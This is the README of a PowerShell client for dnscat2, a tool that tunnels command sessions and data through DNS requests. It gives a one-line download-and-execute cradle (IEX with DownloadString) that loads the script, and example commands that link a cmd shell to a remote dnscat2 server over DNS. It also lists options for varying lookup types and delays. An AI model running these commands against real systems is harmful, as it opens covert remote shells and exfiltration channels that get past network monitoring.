[dnscat2](https://github.com/iagox86/dnscat2) is a DNS covert channel tool by [@iagox86 (Ron Bowes)](https://blog.skullsecurity.org/) which is used to transfer data over DNS requests.

This is a powershell version of the dnscat2 C client.

To use this script, you'll need the ruby [dnscat2 server](https://github.com/iagox86/dnscat2). **Make sure to add the `--no-cache` and `-e open` options when running the server. This client does not support encryption and is incompatible with the server's caching.**

### Setup

[First, install the dnscat2 server.](https://github.com/iagox86/dnscat2/blob/master/README.md)

Next, launch Windows Powershell (version 2.0 or later). You can use this command to load the dnscat2 powershell functions:

    IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')

### Examples

Start-Dnscat2 is the actual function used as the client. Specifiy the dnscat2 server using `-Domain`.

    Start a command session, and send DNS requests to 8.8.8.8 on port 53:
        Start-Dnscat2 -Domain <dnscat2 server> -DNSServer 8.8.8.8

    Send a cmd shell, and send DNS requests to the default DNS Server set in Windows:
        Start-Dnscat2 -Domain <dnscat2 server> -Exec cmd

    Start a console session. Only use CNAME and MX requests:
        Start-Dnscat2 -Domain <dnscat2 server> -LookupTypes @("CNAME","MX") -Console

### Start-Dnscat2

    -Domain <String>          The Domain being used by the dnscat2 server.
    -DNSServer <String>       The hostname or IP Address to send DNS queries to. (Default: Set by Windows)
    -DNSPort <Int32>          The port to send DNS queries to. (Default: 53)
    
    -Command                  Start a command session. (Default)
    -Exec <String>            Link the I/O of a process with the Dnscat2 session.
    -Console                  Link the I/O of the console with the Dnscat2 session.
    
    -LookupTypes <String[]>   Set an array of lookup types to randomly switch between. Default: @(TXT, MX, CNAME)
    -Delay <Int32>            Set a delay between each request, in milliseconds. (Default: 0)
    -MaxPacketSize <Int32>    Maximum length of a dnscat2 packet. (Default: 240)
    -Name <String>            The name of your dnscat2 session. (Default: hostname)

### Currently Unsupported Features
    Encryption
    A and AAAA requests are not supported
